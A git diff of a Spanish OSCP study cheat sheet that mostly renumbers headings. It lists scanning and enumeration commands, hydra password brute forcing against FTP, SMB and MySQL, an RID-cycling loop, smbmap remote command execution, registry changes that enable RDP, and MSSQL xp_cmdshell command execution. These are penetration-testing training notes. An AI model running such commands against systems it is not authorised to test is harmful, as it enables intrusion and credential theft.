@@ -3,109 +3,108 @@
 # OSCP CheetSheet
 Apuntes para la certicación OSCP.
 
-##  1. <a name='tabla-de-contenido'></a>Tabla de Contenido
+# Tabla de Contenido
 
 <!-- vscode-markdown-toc -->
-* 1. [Tabla de Contenido](#tabla-de-contenido)
-* 2. [Comandos](#comandos)
-    * 2.1. [Windows](#windows)
-* 3. [Information Gathering](#information-gathering)
-    * 3.1. [Fping](#fping)
-        * 3.1.1. [Identificación de hosts](#identificación-de-hosts)
-    * 3.2. [Nmap](#nmap)
-        * 3.2.1. [Descubrimiento de host - Ping Scan](#descubrimiento-de-host---ping-scan)
-        * 3.2.2. [Escaneo de puertos](#escaneo-de-puertos)
-        * 3.2.3. [Versión y Servicio](#versión-y-servicio)
-        * 3.2.4. [UDP (top 100)](#udp-(top-100))
-        * 3.2.5. [UDP (top 20)](#udp-(top-20))
-        * 3.2.6. [Obtener ayuda sobre scripts](#obtener-ayuda-sobre-scripts)
-        * 3.2.7. [Listar scripts de Nmap](#listar-scripts-de-nmap)
-        * 3.2.8. [Escaneo de puertos](#escaneo-de-puertos-1)
-        * 3.2.9. [Escaneo de puertos a través de proxychains usando hilos](#escaneo-de-puertos-a-través-de-proxychains-usando-hilos)
-* 4. [Servicios Comunes](#servicios-comunes)
-    * 4.1. [FTP (21)](#ftp-(21))
-        * 4.1.1. [Nmap](#nmap-1)
-        * 4.1.2. [Conexión al servidor FTP](#conexión-al-servidor-ftp)
-        * 4.1.3. [Interactuar con el cliente FTP](#interactuar-con-el-cliente-ftp)
-        * 4.1.4. [Netexec](#netexec)
-        * 4.1.5. [Fuerza bruta de credenciales](#fuerza-bruta-de-credenciales)
-        * 4.1.6. [Archivos de configuración](#archivos-de-configuración)
-        * 4.1.7. [Descargar archivos](#descargar-archivos)
-    * 4.2. [SMB (445)](#smb-(445))
-        * 4.2.1. [Nmap](#nmap-2)
-        * 4.2.2. [smbclient](#smbclient)
-        * 4.2.3. [smbmap](#smbmap)
-        * 4.2.4. [enum4linux](#enum4linux)
-        * 4.2.5. [Netexec](#netexec-1)
-        * 4.2.6. [Rpcclient](#rpcclient)
-        * 4.2.7. [RID Cycling Attack](#rid-cycling-attack)
-        * 4.2.8. [SMB desde Windows](#smb-desde-windows)
-        * 4.2.9. [Interactuar con el cliente SMB](#interactuar-con-el-cliente-smb)
-        * 4.2.10. [Montar una recurso compartido](#montar-una-recurso-compartido)
-        * 4.2.11. [Fuerza bruta de credenciales](#fuerza-bruta-de-credenciales-1)
-    * 4.3. [MYSQL (3306)](#mysql-(3306))
-        * 4.3.1. [Nmap](#nmap-3)
-        * 4.3.2. [Fuerza bruta](#fuerza-bruta)
-        * 4.3.3. [Comandos básicos](#comandos-básicos)
-    * 4.4. [MSSQL (1433)](#mssql-(1433))
-        * 4.4.1. [Nmap](#nmap-4)
-        * 4.4.2. [Netexec](#netexec-2)
-        * 4.4.3. [Conexión](#conexión)
-        * 4.4.4. [Comandos básicos](#comandos-básicos-1)
-        * 4.4.5. [Mostrar el contenido de una base de datos](#mostrar-el-contenido-de-una-base-de-datos)
-        * 4.4.6. [Ejecución de código](#ejecución-de-código)
-    * 4.5. [SNMP (161 - UDP)](#snmp-(161---udp))
-    * 4.6. [RDP (3389)](#rdp-(3389))
-        * 4.6.1. [xfreerdp](#xfreerdp)
-    * 4.7. [Netexec](#netexec-3)
-* 5. [Web](#web)
-    * 5.1. [Enumeración](#enumeración)
-        * 5.1.1. [Fuff](#fuff)
-        * 5.1.2. [Gobuster](#gobuster)
-        * 5.1.3. [Wfuzz](#wfuzz)
-    * 5.2. [Enumeración de CMS](#enumeración-de-cms)
-        * 5.2.1. [Wordpress](#wordpress)
-        * 5.2.2. [Joomla](#joomla)
-        * 5.2.3. [Drupal](#drupal)
-        * 5.2.4. [Magento](#magento)
-* 6. [Pivoting](#pivoting)
-    * 6.1. [Chisel](#chisel)
-        * 6.1.1. [Servidor (Atacante)](#servidor-(atacante))
-        * 6.1.2. [Cliente (Víctima)](#cliente-(víctima))
-        * 6.1.3. [Socat](#socat)
-    * 6.2. [Ligolo-ng](#ligolo-ng)
-        * 6.2.1. [Descargar el Proxy y el Agente](#descargar-el-proxy-y-el-agente)
-        * 6.2.2. [Preparar las interfaces para el tunel](#preparar-las-interfaces-para-el-tunel)
-        * 6.2.3. [Configurar proxy en la máquina del atacante](#configurar-proxy-en-la-máquina-del-atacante)
-        * 6.2.4. [Configurar el agente en la máquina víctima](#configurar-el-agente-en-la-máquina-víctima)
-        * 6.2.5. [Configurar la sesión](#configurar-la-sesión)
-* 7. [Passwords Attacks](#passwords-attacks)
-* 8. [Transferencia de Archivos](#transferencia-de-archivos)
-    * 8.1. [Windows](#windows-1)
-    * 8.2. [Linux](#linux)
-* 9. [Movimiento Lateral](#movimiento-lateral)
-    * 9.1. [Windows](#windows-2)
-    * 9.2. [Linux](#linux-1)
-* 10. [Escalación de Privilegios](#escalación-de-privilegios)
-    * 10.1. [Windows](#windows-3)
-        * 10.1.1. [Enumeración](#enumeración-1)
-        * 10.1.2. [Escalación de Privilegios](#escalación-de-privilegios-1)
-    * 10.2. [Linux](#linux-2)
-* 11. [Active Directory](#active-directory)
-    * 11.1. [Enumeración](#enumeración-2)
-    * 11.2. [Kerberos](#kerberos)
-    * 11.3. [Explotación](#explotación)
-    * 11.4. [Movimiento Lateral](#movimiento-lateral-1)
-    * 11.5. [Post Explotación](#post-explotación)
-* 12. [Herramientas y Recursos](#herramientas-y-recursos)
-    * 12.1. [Pivoting](#pivoting-1)
-    * 12.2. [Information Gathering](#information-gathering-1)
-    * 12.3. [Web](#web-1)
-    * 12.4. [Bases de datos](#bases-de-datos)
-    * 12.5. [Passwords Attacks](#passwords-attacks-1)
-    * 12.6. [Wordlists](#wordlists)
-    * 12.7. [Escalación de Privilegios](#escalación-de-privilegios-2)
-    * 12.8. [Recursos y Blogs](#recursos-y-blogs)
+* 1. [Comandos](#comandos)
+    * 1.1. [Windows](#windows)
+* 2. [Information Gathering](#information-gathering)
+    * 2.1. [Fping](#fping)
+        * 2.1.1. [Identificación de hosts](#identificación-de-hosts)
+    * 2.2. [Nmap](#nmap)
+        * 2.2.1. [Descubrimiento de host - Ping Scan](#descubrimiento-de-host---ping-scan)
+        * 2.2.2. [Escaneo de puertos](#escaneo-de-puertos)
+        * 2.2.3. [Versión y Servicio](#versión-y-servicio)
+        * 2.2.4. [UDP (top 100)](#udp-(top-100))
+        * 2.2.5. [UDP (top 20)](#udp-(top-20))
+        * 2.2.6. [Obtener ayuda sobre scripts](#obtener-ayuda-sobre-scripts)
+        * 2.2.7. [Listar scripts de Nmap](#listar-scripts-de-nmap)
+        * 2.2.8. [Escaneo de puertos](#escaneo-de-puertos-1)
+        * 2.2.9. [Escaneo de puertos a través de proxychains usando hilos](#escaneo-de-puertos-a-través-de-proxychains-usando-hilos)
+* 3. [Servicios Comunes](#servicios-comunes)
+    * 3.1. [FTP (21)](#ftp-(21))
+        * 3.1.1. [Nmap](#nmap-1)
+        * 3.1.2. [Conexión al servidor FTP](#conexión-al-servidor-ftp)
+        * 3.1.3. [Interactuar con el cliente FTP](#interactuar-con-el-cliente-ftp)
+        * 3.1.4. [Netexec](#netexec)
+        * 3.1.5. [Fuerza bruta de credenciales](#fuerza-bruta-de-credenciales)
+        * 3.1.6. [Archivos de configuración](#archivos-de-configuración)
+        * 3.1.7. [Descargar archivos](#descargar-archivos)
+    * 3.2. [SMB (445)](#smb-(445))
+        * 3.2.1. [Nmap](#nmap-2)
+        * 3.2.2. [smbclient](#smbclient)
+        * 3.2.3. [smbmap](#smbmap)
+        * 3.2.4. [enum4linux](#enum4linux)
+        * 3.2.5. [Netexec](#netexec-1)
+        * 3.2.6. [Rpcclient](#rpcclient)
+        * 3.2.7. [RID Cycling Attack](#rid-cycling-attack)
+        * 3.2.8. [SMB desde Windows](#smb-desde-windows)
+        * 3.2.9. [Interactuar con el cliente SMB](#interactuar-con-el-cliente-smb)
+        * 3.2.10. [Montar una recurso compartido](#montar-una-recurso-compartido)
+        * 3.2.11. [Fuerza bruta de credenciales](#fuerza-bruta-de-credenciales-1)
+    * 3.3. [MYSQL (3306)](#mysql-(3306))
+        * 3.3.1. [Nmap](#nmap-3)
+        * 3.3.2. [Fuerza bruta](#fuerza-bruta)
+        * 3.3.3. [Comandos básicos](#comandos-básicos)
+    * 3.4. [MSSQL (1433)](#mssql-(1433))
+        * 3.4.1. [Nmap](#nmap-4)
+        * 3.4.2. [Netexec](#netexec-2)
+        * 3.4.3. [Conexión](#conexión)
+        * 3.4.4. [Comandos básicos](#comandos-básicos-1)
+        * 3.4.5. [Mostrar el contenido de una base de datos](#mostrar-el-contenido-de-una-base-de-datos)
+        * 3.4.6. [Ejecución de código](#ejecución-de-código)
+    * 3.5. [SNMP (161 - UDP)](#snmp-(161---udp))
+    * 3.6. [RDP (3389)](#rdp-(3389))
+        * 3.6.1. [xfreerdp](#xfreerdp)
+    * 3.7. [Netexec](#netexec-3)
+* 4. [Web](#web)
+    * 4.1. [Enumeración](#enumeración)
+        * 4.1.1. [Fuff](#fuff)
+        * 4.1.2. [Gobuster](#gobuster)
+        * 4.1.3. [Wfuzz](#wfuzz)
+    * 4.2. [Enumeración de CMS](#enumeración-de-cms)
+        * 4.2.1. [Wordpress](#wordpress)
+        * 4.2.2. [Joomla](#joomla)
+        * 4.2.3. [Drupal](#drupal)
+        * 4.2.4. [Magento](#magento)
+* 5. [Pivoting](#pivoting)
+    * 5.1. [Chisel](#chisel)
+        * 5.1.1. [Servidor (Atacante)](#servidor-(atacante))
+        * 5.1.2. [Cliente (Víctima)](#cliente-(víctima))
+        * 5.1.3. [Socat](#socat)
+    * 5.2. [Ligolo-ng](#ligolo-ng)
+        * 5.2.1. [Descargar el Proxy y el Agente](#descargar-el-proxy-y-el-agente)
+        * 5.2.2. [Preparar las interfaces para el tunel](#preparar-las-interfaces-para-el-tunel)
+        * 5.2.3. [Configurar proxy en la máquina del atacante](#configurar-proxy-en-la-máquina-del-atacante)
+        * 5.2.4. [Configurar el agente en la máquina víctima](#configurar-el-agente-en-la-máquina-víctima)
+        * 5.2.5. [Configurar la sesión](#configurar-la-sesión)
+* 6. [Passwords Attacks](#passwords-attacks)
+* 7. [Transferencia de Archivos](#transferencia-de-archivos)
+    * 7.1. [Windows](#windows-1)
+    * 7.2. [Linux](#linux)
+* 8. [Movimiento Lateral](#movimiento-lateral)
+    * 8.1. [Windows](#windows-2)
+    * 8.2. [Linux](#linux-1)
+* 9. [Escalación de Privilegios](#escalación-de-privilegios)
+    * 9.1. [Windows](#windows-3)
+        * 9.1.1. [Enumeración](#enumeración-1)
+        * 9.1.2. [Escalación de Privilegios](#escalación-de-privilegios-1)
+    * 9.2. [Linux](#linux-2)
+* 10. [Active Directory](#active-directory)
+    * 10.1. [Enumeración](#enumeración-2)
+    * 10.2. [Kerberos](#kerberos)
+    * 10.3. [Explotación](#explotación)
+    * 10.4. [Movimiento Lateral](#movimiento-lateral-1)
+    * 10.5. [Post Explotación](#post-explotación)
+* 11. [Herramientas y Recursos](#herramientas-y-recursos)
+    * 11.1. [Pivoting](#pivoting-1)
+    * 11.2. [Information Gathering](#information-gathering-1)
+    * 11.3. [Web](#web-1)
+    * 11.4. [Bases de datos](#bases-de-datos)
+    * 11.5. [Passwords Attacks](#passwords-attacks-1)
+    * 11.6. [Wordlists](#wordlists)
+    * 11.7. [Escalación de Privilegios](#escalación-de-privilegios-2)
+    * 11.8. [Recursos y Blogs](#recursos-y-blogs)
 
 <!-- vscode-markdown-toc-config
 	numbering=true
@@ -113,9 +112,9 @@ Apuntes para la certicación OSCP.
 	/vscode-markdown-toc-config -->
 <!-- /vscode-markdown-toc -->
 
-##  2. <a name='comandos'></a>Comandos
+##  1. <a name='comandos'></a>Comandos
 
-###  2.1. <a name='windows'></a>Windows
+###  1.1. <a name='windows'></a>Windows
 
 ##### Habilitar WinRM
 
@@ -130,11 +129,11 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnec
 netsh advfirewall firewall set rule group="remote desktop" new enable=yes
 ```
 
-##  3. <a name='information-gathering'></a>Information Gathering
+##  2. <a name='information-gathering'></a>Information Gathering
 
-###  3.1. <a name='fping'></a>Fping
+###  2.1. <a name='fping'></a>Fping
 
-####  3.1.1. <a name='identificación-de-hosts'></a>Identificación de hosts
+####  2.1.1. <a name='identificación-de-hosts'></a>Identificación de hosts
 
 ```bash
 fping -asgq 172.16.0.1/24
@@ -152,9 +151,9 @@ Parámetros utilizados:
 
 Con el escaneo realizado anteriormente con fping podemos armar una lista de hosts activos.
 
-###  3.2. <a name='nmap'></a>Nmap
+###  2.2. <a name='nmap'></a>Nmap
 
-####  3.2.1. <a name='descubrimiento-de-host---ping-scan'></a>Descubrimiento de host - Ping Scan
+####  2.2.1. <a name='descubrimiento-de-host---ping-scan'></a>Descubrimiento de host - Ping Scan
 
 ```bash
 sudo nmap -sn <TARGET-RANGE>
@@ -165,7 +164,7 @@ sudo nmap -sn 192.168.56.1/24
 
 - `-sn` Esta opción le dice a Nmap que no haga un escaneo de puertos después del descubrimiento de hosts y que sólo imprima los hosts disponibles que respondieron a la traza icmp.
 
-####  3.2.2. <a name='escaneo-de-puertos'></a>Escaneo de puertos
+####  2.2.2. <a name='escaneo-de-puertos'></a>Escaneo de puertos
 
 ```bash
 sudo nmap -p- --open -Pn -n <RHOST> -oG openPorts -vvv
@@ -182,7 +181,7 @@ Parámetros utilizados:
 - `-oG`: Determina el formato del archivo en el cual se guardan los resultados obtenidos. En este caso, es un formato _grepeable_, el cual almacena todo en una sola línea. De esta forma, es más sencillo procesar y obtener los puertos abiertos por medio de expresiones regulares, en conjunto con otras utilidades como pueden ser grep, awk, sed, entre otras.
 - `-vvv`: Activa el modo _verbose_ para que nos muestre resultados a medida que los encuentra.
 
-####  3.2.3. <a name='versión-y-servicio'></a>Versión y Servicio
+####  2.2.3. <a name='versión-y-servicio'></a>Versión y Servicio
 
 ```bash
 sudo nmap -sCV -p<PORTS> <RHOST> -oN servicesScan -vvv 
@@ -193,30 +192,30 @@ sudo nmap -sCV -p<PORTS> <RHOST> -oN servicesScan -vvv
 - `-oN`: Determina el formato del archivo en el cual se guardan los resultados obtenidos. En este caso, es el formato por defecto de nmap.
 - `-vvv`: Activa el modo _verbose_ para que nos muestre resultados a medida que los encuentra.
 
-####  3.2.4. <a name='udp-(top-100)'></a>UDP (top 100)
+####  2.2.4. <a name='udp-(top-100)'></a>UDP (top 100)
 
 ```bash
 sudo nmap -n -v -sU -F -T4 --reason --open -T4 -oA nmap/udp-fast <RHOST>
 ```
 
-####  3.2.5. <a name='udp-(top-20)'></a>UDP (top 20)
+####  2.2.5. <a name='udp-(top-20)'></a>UDP (top 20)
 
 ```bash
 sudo nmap -n -v -sU -T4 --top-ports=20 --reason --open -oA nmap/udp-top20 <RHOST>
 ```
 
-####  3.2.6. <a name='obtener-ayuda-sobre-scripts'></a>Obtener ayuda sobre scripts
+####  2.2.6. <a name='obtener-ayuda-sobre-scripts'></a>Obtener ayuda sobre scripts
 
 ```bash
 nmap --script-help="http-*"
 ```
 
-####  3.2.7. <a name='listar-scripts-de-nmap'></a>Listar scripts de Nmap
+####  2.2.7. <a name='listar-scripts-de-nmap'></a>Listar scripts de Nmap
 
 ```bash
 locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
 ```
-####  3.2.8. <a name='escaneo-de-puertos-1'></a>Escaneo de puertos
+####  2.2.8. <a name='escaneo-de-puertos-1'></a>Escaneo de puertos
 
 ##### Descubrimiento de hosts Windows
 
@@ -271,20 +270,20 @@ done; wait
 ```bash
 ./portDiscovery.sh <RHOST>
 ```
-####  3.2.9. <a name='escaneo-de-puertos-a-través-de-proxychains-usando-hilos'></a>Escaneo de puertos a través de proxychains usando hilos
+####  2.2.9. <a name='escaneo-de-puertos-a-través-de-proxychains-usando-hilos'></a>Escaneo de puertos a través de proxychains usando hilos
 
 ```bash
 seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -p{} -open -T5 -Pn -n <RHOST> -vvv -oN servicesScan 2>&1 | grep "tcp open"
 ```
 
-##  4. <a name='servicios-comunes'></a>Servicios Comunes
+##  3. <a name='servicios-comunes'></a>Servicios Comunes
 
-###  4.1. <a name='ftp-(21)'></a>FTP (21)
+###  3.1. <a name='ftp-(21)'></a>FTP (21)
 
 El Protocolo de Transferencia de Archivos (FTP, por sus siglas en inglés) es un protocolo de red utilizado para la transferencia de archivos entre sistemas que están conectados a una red TCP/IP, basado en una arquitectura *cliente-servidor*. Este protocolo permite la transmisión eficiente de archivos a través de la red, proporcionando servicios de autenticación y control de acceso.
 
 Por defecto, el puerto asignado para la comunicación FTP es el puerto 21.
-####  4.1.1. <a name='nmap-1'></a>Nmap
+####  3.1.1. <a name='nmap-1'></a>Nmap
 
 Cuando lanzamos una enumeración usando Nmap, se utilizan por defecto una serie de scripts que comprueban si se permite el acceso de forma anonima.
 
@@ -308,7 +307,7 @@ Scripts de `nmap` utiles para este servicio:
 sudo nmap -p21 --script=ftp-anon <RHOST> -vvv
 ```
 
-####  4.1.2. <a name='conexión-al-servidor-ftp'></a>Conexión al servidor FTP
+####  3.1.2. <a name='conexión-al-servidor-ftp'></a>Conexión al servidor FTP
 
 ```bash
 # -A: Esta opción es específica del cliente FTP y suele utilizarse para activar 
@@ -322,7 +321,7 @@ nc -nvc <RHOST> 21
 telnet <RHOST> 21
 ```
 
-####  4.1.3. <a name='interactuar-con-el-cliente-ftp'></a>Interactuar con el cliente FTP
+####  3.1.3. <a name='interactuar-con-el-cliente-ftp'></a>Interactuar con el cliente FTP
 
 ```bash
 ftp> anonymous # usuario
@@ -349,7 +348,7 @@ ftp> mdelete *.txt # borra multiples archivos que cumplan con el patrón
 ftp> exit # abandona la conexión ftp
 ```
 
-####  4.1.4. <a name='netexec'></a>Netexec
+####  3.1.4. <a name='netexec'></a>Netexec
 
 ```bash
 nxc ftp <RHOST> -u <USER> -p <PASSWORD>
@@ -360,25 +359,25 @@ nxc ftp <RHOST> -u <USER> -p <PASSWORD> --ls <DIRECTORY>
 nxc ftp <RHOST> -u <USER> -p <PASSWORD> --get <FILE>
 nxc ftp <RHOST> -u <USER> -p <PASSWORD> --put <FILE>
 ```
-####  4.1.5. <a name='fuerza-bruta-de-credenciales'></a>Fuerza bruta de credenciales
+####  3.1.5. <a name='fuerza-bruta-de-credenciales'></a>Fuerza bruta de credenciales
 
 ```bash
 hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<RHOST>
 ```
 
-####  4.1.6. <a name='archivos-de-configuración'></a>Archivos de configuración
+####  3.1.6. <a name='archivos-de-configuración'></a>Archivos de configuración
 
 - `/etc/ftpusers`
 - `/etc/vsftpd.conf`
 - `/etc/ftp.conf`
 - `/etc/proftpd.conf`
 
-####  4.1.7. <a name='descargar-archivos'></a>Descargar archivos
+####  3.1.7. <a name='descargar-archivos'></a>Descargar archivos
 
 ```bash
 wget -m ftp://anonymous:anonymous@<RHOST>
 ```
-###  4.2. <a name='smb-(445)'></a>SMB (445)
+###  3.2. <a name='smb-(445)'></a>SMB (445)
 
 SMB (Server Message Block) es un protocolo diseñado para la compartición de archivos en red, facilitando la interconexión de archivos y periféricos como impresoras y puertos serie entre ordenadores dentro de una red local (LAN).
 
@@ -392,7 +391,7 @@ El protocolo SMB utiliza dos niveles de autenticación, a saber:
     
 - **Autenticación de recurso compartido**: los usuarios deben proporcionar una contraseña para acceder a un recurso compartido restringido.
 
-####  4.2.1. <a name='nmap-2'></a>Nmap
+####  3.2.1. <a name='nmap-2'></a>Nmap
 
 Scripts de `nmap` utiles para este servicio:
 
@@ -411,7 +410,7 @@ Sintaxis:
 ```bash
 sudo nmap -p445 --script <script> <RHOST>
 ```
-####  4.2.2. <a name='smbclient'></a>smbclient
+####  3.2.2. <a name='smbclient'></a>smbclient
 
 Es un cliente que nos permite acceder a recursos compartidos en servidores SMB.
 
@@ -426,7 +425,7 @@ smbclient //<RHOST>/Public -N
 smbclient //<RHOST>/Public -U elliot
 ```
 
-####  4.2.3. <a name='smbmap'></a>smbmap
+####  3.2.3. <a name='smbmap'></a>smbmap
 
 SMBMap permite a los usuarios enumerar las unidades compartidas samba en todo un dominio. Enumera las unidades compartidas, los permisos de las unidades, el contenido compartido, la funcionalidad de carga/descarga, la coincidencia de patrones de descarga automática de nombres de archivo e incluso la ejecución de comandos remotos.
 
@@ -458,7 +457,7 @@ smbmap -H <RHOST> -u <USER> -p <PASSWORD> --download 'tmp/file'
 smbmap -u <USER> -p <PASSWORD> -H <RHOST> -x 'ipconfig'
 ```
 
-####  4.2.4. <a name='enum4linux'></a>enum4linux
+####  3.2.4. <a name='enum4linux'></a>enum4linux
 
 Enum4linux es una herramienta utilizada para extraer información de hosts de Windows y Samba. La herramienta está escrita en Perl y envuelta en herramientas de samba `smbclient`, `rpcclient`, `net` y `nslookup`.
 
@@ -484,7 +483,7 @@ enum4linux -i <RHOST>
 enum4linux -r -u <user> -p <password> <RHOST>
 ```
 
-####  4.2.5. <a name='netexec-1'></a>Netexec
+####  3.2.5. <a name='netexec-1'></a>Netexec
 
 Netexec, anteriormente conocido como **CrackMapExec (CME)**, es una herramienta de código. que permite automatizar tareas relacionadas con la enumeración y explotación de sistemas Windows y Linux, como la ejecución de comandos remotos, la obtención de credenciales y la evaluación de la seguridad en entornos de redes grandes. Netexec permite realizar tareas de forma masiva en múltiples sistemas a la vez, facilitando la identificación de vulnerabilidades y configuraciones incorrectas en una red.
 
@@ -541,7 +540,7 @@ nxc smb <RHOST> -u <USER> -p <PASSWORD> --wmi
 nxc smb <RHOST> -u <USER> -p <PASSWORD> --wmi-namespace
 ```
 
-####  4.2.6. <a name='rpcclient'></a>Rpcclient
+####  3.2.6. <a name='rpcclient'></a>Rpcclient
 
 Rpcclient es una utilidad que forma parte del conjunto de herramientas Samba. Se utiliza para interactuar con el protocolo Remote Procedure Call (RPC) de Microsoft, que se utiliza para la comunicación entre los sistemas basados en Windows y otros dispositivos. rpcclient se utiliza principalmente para fines de depuración y pruebas, y se puede utilizar para consultar y manipular sistemas remotos.
 
@@ -579,13 +578,13 @@ La sintaxis básica del parámetro `-c` es la siguiente:
 rpcclient -U username //<RHOST> -c "command1; command2; command3"
 ```
 
-####  4.2.7. <a name='rid-cycling-attack'></a>RID Cycling Attack
+####  3.2.7. <a name='rid-cycling-attack'></a>RID Cycling Attack
 
 ```bash
 seq 1 5000 | xargs -P 50 -I{} rpcclient -U "" 30.30.30.4 -N -c "lookupsids S-1-22-1-{}" 2>&1
 ```
 
-####  4.2.8. <a name='smb-desde-windows'></a>SMB desde Windows
+####  3.2.8. <a name='smb-desde-windows'></a>SMB desde Windows
 
 ```powershell
 # listar recursos compartidos
@@ -611,7 +610,7 @@ Recursos compartidos comunes en Windows:
 - `SYSVOL` sólo en DCs    
 - `NETLOGON` sólo en los DC
 
-####  4.2.9. <a name='interactuar-con-el-cliente-smb'></a>Interactuar con el cliente SMB
+####  3.2.9. <a name='interactuar-con-el-cliente-smb'></a>Interactuar con el cliente SMB
 
 ```
 smb: \> help # muestra la ayuda
@@ -620,24 +619,24 @@ smb: \> put file.txt # subir un archivo
 smb: \> get file.txt # descargar un archivo
 ```
 
-####  4.2.10. <a name='montar-una-recurso-compartido'></a>Montar una recurso compartido
+####  3.2.10. <a name='montar-una-recurso-compartido'></a>Montar una recurso compartido
 
 ```bash
 mount -t cifs -o "username=user,password=password" //<RHOST>/share /mnt/share
 ```
 
-####  4.2.11. <a name='fuerza-bruta-de-credenciales-1'></a>Fuerza bruta de credenciales
+####  3.2.11. <a name='fuerza-bruta-de-credenciales-1'></a>Fuerza bruta de credenciales
 
 ```bash
 nmap --script smb-brute -p 445 <RHOST>
 hydra -l admin -P /usr/share/wordlist/rockyou.txt <RHOST> smb
 ```
 
-###  4.3. <a name='mysql-(3306)'></a>MYSQL (3306)
+###  3.3. <a name='mysql-(3306)'></a>MYSQL (3306)
 
 MySQL es un sistema de gestión de bases de datos relacional de código abierto. Es ampliamente utilizado para almacenar, gestionar y recuperar datos en diversas aplicaciones, desde sitios web hasta sistemas empresariales. MySQL es conocido por su alta performance, escalabilidad, y confiabilidad. Ofrece soporte para múltiples usuarios y transacciones simultáneas, y utiliza el lenguaje SQL (Structured Query Language) para la gestión de los datos. MySQL es compatible con numerosas plataformas y se integra fácilmente con lenguajes de programación como PHP, Java y Python.
 
-####  4.3.1. <a name='nmap-3'></a>Nmap
+####  3.3.1. <a name='nmap-3'></a>Nmap
 
 Scripts de `nmap` utiles para este servicio:
 
@@ -673,13 +672,13 @@ sudo nmap -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root
 sudo nmap -p 3306 --script=mysql-query --script-args="query='select * from books.authors;',username='root',password=''" <RHOST> -vvv
 ```
 
-####  4.3.2. <a name='fuerza-bruta'></a>Fuerza bruta
+####  3.3.2. <a name='fuerza-bruta'></a>Fuerza bruta
 
 ```bash
 hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<RHOST> mysql
 ```
 
-####  4.3.3. <a name='comandos-básicos'></a>Comandos básicos
+####  3.3.3. <a name='comandos-básicos'></a>Comandos básicos
 
 ```mysql
 SHOW DATABASES; # listar las bases de datos
@@ -691,11 +690,11 @@ SELECT <column_name>,<column_name>,<column_name...> FROM <TABLE>; # listar el co
 SHOW EVENTS; # mostrar los eventos programados
 ```
 
-###  4.4. <a name='mssql-(1433)'></a>MSSQL (1433)
+###  3.4. <a name='mssql-(1433)'></a>MSSQL (1433)
 
 MSSQL, o Microsoft SQL Server, es un sistema de gestión de bases de datos relacional desarrollado por Microsoft. Es utilizado para almacenar y recuperar datos según las necesidades de diferentes aplicaciones, desde pequeñas a grandes empresas. MSSQL ofrece características avanzadas como soporte para transacciones, integridad referencial, seguridad robusta y herramientas de administración y desarrollo. Es conocido por su integración estrecha con otros productos de Microsoft, como .NET Framework y Azure, y utiliza T-SQL (Transact-SQL) como su lenguaje de consulta.
 
-####  4.4.1. <a name='nmap-4'></a>Nmap
+####  3.4.1. <a name='nmap-4'></a>Nmap
 
 Scripts de `nmap` utiles para este servicio:
 
@@ -726,7 +725,7 @@ sudo nmap -p 1433 --script ms-sql-query --script-args mssql.username=<USER>,mssq
 sudo nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PASSWORD>,ms-sql-xp-cmdshell.cmd="type C:\flag.txt" <RHOST>
 ```
 
-####  4.4.2. <a name='netexec-2'></a>Netexec
+####  3.4.2. <a name='netexec-2'></a>Netexec
 
 ```bash
 # Realiza una consulta SQL
@@ -750,7 +749,7 @@ nxc mssql <RHOST> -u <USER> -p <PASSWORD> --share <SHARE_NAME> --get-file <REMOT
 # Subir un archivo local en una ubicación remota
 nxc mssql <RHOST> -u <USER> -p <PASSWORD> --share <SHARE_NAME> --put-file <LOCAL_FILENAME> <REMOTE_FILENAME>
 ```
-####  4.4.3. <a name='conexión'></a>Conexión
+####  3.4.3. <a name='conexión'></a>Conexión
 
 ```powershell
 sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
@@ -767,7 +766,7 @@ impacket-mssqlclient <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
 export KRB5CCNAME=<USERNAME>.ccache
 impacket-mssqlclient -k <RHOST>.<DOMAIN
 ```
-####  4.4.4. <a name='comandos-básicos-1'></a>Comandos básicos
+####  3.4.4. <a name='comandos-básicos-1'></a>Comandos básicos
 
 ```sql
 SELECT @@version;
@@ -775,14 +774,14 @@ SELECT name FROM sys.databases;
 SELECT * FROM <DATABASE>.information_schema.tables;
 SELECT * FROM <DATABASE>.dbo.users;
 ```
-####  4.4.5. <a name='mostrar-el-contenido-de-una-base-de-datos'></a>Mostrar el contenido de una base de datos
+####  3.4.5. <a name='mostrar-el-contenido-de-una-base-de-datos'></a>Mostrar el contenido de una base de datos
 
 ```sql
 1> SELECT name FROM master.sys.databases
 2> go
 ```
 
-####  4.4.6. <a name='ejecución-de-código'></a>Ejecución de código
+####  3.4.6. <a name='ejecución-de-código'></a>Ejecución de código
 
 En MSSQL gracias a la palabra clave `execute`, podemos ejecutar el comando arbitrario en el sistema operativo. Para hacer eso primero tenemos que habilitar la ejecución del comando dentro de la base de datos de la siguiente forma:
 
@@ -798,7 +797,7 @@ De esta forma, ya podemos ejecutar comandos:
 ```sql
 EXECUTE xp_cmdshell 'whoami'
 ```
-###  4.5. <a name='snmp-(161---udp)'></a>SNMP (161 - UDP)
+###  3.5. <a name='snmp-(161---udp)'></a>SNMP (161 - UDP)
 
 El Protocolo Simple de Administración de Red, o SNMP por sus siglas en inglés, es un protocolo basado en UDP que, inicialmente, fue implementado de manera no muy segura. Cuenta con una base de datos (MIB) que almacena información relacionada con la red. El puerto predeterminado de SNMP es el 161 UDP. Hasta la tercera versión de este protocolo, SNMPv3, la seguridad de SNMP era deficiente. Existen diversas herramientas para interactuar con SNMP, ya que este protocolo puede proporcionarnos mucha información acerca de una organización, basándose en las respuestas del servidor. Algunas herramientas útiles incluyen _onesixtyone_ para realizar ataques de fuerza bruta básicos y enumeración, y _snmpwalk_ para acceder a los datos de la base de datos MIB.
 
@@ -835,11 +834,11 @@ snmpwalk -v2c -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
 
 Referencias: [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html)
 
-###  4.6. <a name='rdp-(3389)'></a>RDP (3389)
+###  3.6. <a name='rdp-(3389)'></a>RDP (3389)
 
